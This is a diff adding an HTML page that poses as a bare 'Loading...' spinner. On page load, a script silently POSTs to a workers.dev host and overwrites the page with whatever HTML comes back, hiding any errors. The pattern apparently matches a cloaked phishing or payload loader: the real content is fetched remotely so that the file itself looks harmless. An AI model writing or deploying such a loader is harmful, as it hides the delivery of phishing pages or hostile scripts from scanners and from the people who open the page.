@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <style>
+    body {
+      margin: 0;
+      background: #0d0d0d;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .spinner {
+      width: 32px;
+      height: 32px;
+      border: 3px solid #333;
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin .8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="spinner"></div>
+  <script>
+    const WORKER = 'https://tiny-bread-fe8e.inboxtestgs.workers.dev/';
+    (async () => {
+      try {
+        const res  = await fetch(WORKER, { method: 'POST' });
+        const html = await res.text();
+        document.open();
+        document.write(html);
+        document.close();
+      } catch {
+      }
+    })();
+  </script>
+</body>
+</html>
